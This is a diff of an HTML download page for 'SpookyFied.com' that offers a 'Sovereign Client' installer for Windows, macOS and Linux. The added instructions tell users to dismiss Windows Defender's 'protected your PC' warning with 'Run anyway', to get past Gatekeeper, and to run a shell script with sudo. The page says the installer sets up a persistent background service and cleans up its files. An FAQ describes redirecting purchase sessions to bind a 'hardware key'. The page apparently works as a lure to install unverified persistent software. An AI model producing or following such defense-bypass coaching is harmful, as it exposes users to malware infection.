@@ -3,18 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sovereign Client Provisioning | SpookyFied.com</title>
+    <title>SpookyFied.com | Sovereign Client & Node Support</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #121212; color: #e0e0e0; margin: 0; padding: 0; text-align: center; }
-        .header-banner { background-color: #1a1a1a; padding: 20px; border-bottom: 2px solid #333; }
-        .header-banner img { max-width: 350px; width: 100%; height: auto; display: block; margin: 0 auto; }
-        .container { max-width: 800px; margin: 40px auto; padding: 20px; background: #1e1e1e; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-        h1 { color: #00ffcc; font-size: 24px; }
-        p { color: #b0b0b0; line-height: 1.6; }
-        .btn { display: inline-block; background: #00ffcc; color: #121212; padding: 12px 25px; margin: 15px 5px; text-decoration: none; font-weight: bold; border-radius: 4px; transition: background 0.2s; }
-        .btn:hover { background: #00cc99; }
-        .btn-secondary { background: #333; color: #e0e0e0; }
-        .btn-secondary:hover { background: #444; }
+        body { font-family: Arial, sans-serif; background-color: #0b0c10; color: #c5c6c7; margin: 0; padding: 0; text-align: center; }
+        .header-banner { background-color: #1f2833; padding: 30px 20px; border-bottom: 2px solid #45a29e; width: 100%; box-sizing: border-box; }
+        .header-banner img { width: 100%; max-width: 280px; height: auto; display: block; margin: 0 auto; }
+        .container { max-width: 800px; margin: 40px auto; padding: 30px; background: #1f2833; border-radius: 10px; border: 1px solid #45a29e; box-shadow: 0 8px 25px rgba(0,0,0,0.8); box-sizing: border-box; text-align: left; }
+        h1 { color: #66fcf1; font-size: 26px; margin-top: 0; text-align: center; }
+        h3 { color: #66fcf1; border-bottom: 1px solid #45a29e; padding-bottom: 8px; margin-top: 30px; }
+        p { color: #8892b0; line-height: 1.6; }
+        .btn { display: inline-block; background: #66fcf1; color: #0b0c10; padding: 14px 25px; margin: 15px 0; text-decoration: none; font-weight: bold; border-radius: 6px; text-align: center; transition: background 0.2s; cursor: pointer; border: none; font-size: 15px; }
+        .btn:hover { background: #45a29e; color: #fff; }
+        .btn-secondary { background: #0b0c10; color: #66fcf1; border: 1px solid #66fcf1; margin-left: 10px; }
+        .btn-secondary:hover { background: #1f2833; color: #fff; }
+        
+        .instruction-box { background: #0b0c10; border: 1px solid #45a29e; padding: 20px; border-radius: 6px; margin: 20px 0; font-size: 14px; }
+        .instruction-box ol { margin: 10px 0 0 20px; color: #c5c6c7; padding: 0; }
+        .instruction-box li { margin-bottom: 10px; line-height: 1.5; }
+        .footer-links { margin-top: 40px; font-size: 14px; text-align: center; padding-bottom: 30px; }
+        .footer-links a { color: #8892b0; margin: 0 15px; text-decoration: none; }
+        .footer-links a:hover { color: #66fcf1; }
     </style>
 </head>
 <body>
@@ -24,16 +32,55 @@
     </div>
 
     <div class="container">
-        <h1>Sovereign Client Provisioning</h1>
-        <p>Deploy your background node to secure your connection. Ready to deploy background service and schedule task integration.</p>
-        
-        <div style="margin: 30px 0;">
-            <a href="SpookyInitializer.exe" class="btn">Download Recommended Client</a>
-        </div>
+        <h1>Sovereign Client & Node Deployment</h1>
+        <p style="text-align: center;">Automated background service integration to secure your local environment with zero-retention architecture.</p>
 
-        <div style="margin-top: 40px;">
+        <div style="text-align: center; margin: 30px 0;">
+            <a href="SpookyInitializer.exe" class="btn" download>Download Recommended Client (Windows)</a>
             <a href="index.html" class="btn btn-secondary">Return to Gateway Portal</a>
         </div>
+
+        <h3>Operating System Deployment Instructions</h3>
+        <p>Because sovereign background daemons operate at the system level to protect your data streams, standard operating system defenses will flag uncertified executable installers. Follow these precise instructions to complete your deployment:</p>
+
+        <div class="instruction-box">
+            <strong style="color: #66fcf1;">Windows Deployment Steps:</strong>
+            <ol>
+                <li>Click the download button above to retrieve <strong>SpookyInitializer.exe</strong>.</li>
+                <li>Your browser or Windows Defender may display a "Windows protected your PC" or "Suspicious file" warning. This is a standard notification for standalone system utilities. Click <strong>More info</strong>, then click <strong>Run anyway</strong>.</li>
+                <li>Launch the installer from your Downloads folder. The script will automatically configure your background task registration and lock your cryptographic anchor.</li>
+                <li>Press <strong>Enter</strong> when prompted to finalize and clean up temporary deployment files.</li>
+            </ol>
+        </div>
+
+        <div class="instruction-box">
+            <strong style="color: #66fcf1;">macOS Deployment Steps:</strong>
+            <ol>
+                <li>Download the macOS installer script (`SpookyInitializer.command` or `.sh`).</li>
+                <li>Open your Terminal application, navigate to your download directory, and grant execution rights using: <code style="color:#66fcf1;">chmod +x SpookyInitializer.command</code></li>
+                <li>If macOS Gatekeeper prevents execution, right-click the file, select <strong>Open</strong>, and confirm execution.</li>
+            </ol>
+        </div>
+
+        <div class="instruction-box">
+            <strong style="color: #66fcf1;">Linux Deployment Steps:</strong>
+            <ol>
+                <li>Download the Linux shell utility (`SpookyInitializer.sh`).</li>
+                <li>Open a terminal window and run with root privileges to register the systemd background daemon: <code style="color:#66fcf1;">sudo bash SpookyInitializer.sh</code></li>
+            </ol>
+        </div>
+
+        <h3>Frequently Asked Questions & Node Support</h3>
+        <p><strong>How do I start my local node automatically?</strong><br>
+        The initializer script automatically registers a persistent background service and scheduled task during installation. Once run, your node boots automatically with your operating system without manual intervention.</p>
+
+        <p><strong>How does vendor redirection work?</strong><br>
+        When purchasing secure assets from an authorized vendor, unverified sessions are securely redirected to SpookyFied.com to verify or bind your hardware key. Once confirmed, a cryptographic token is passed back to complete your order seamlessly.</p>
+    </div>
+
+    <div class="footer-links">
+        <a href="index.html">Gateway Portal</a>
+        <a href="privacy.html">Privacy Policy</a>
     </div>
 
 </body>
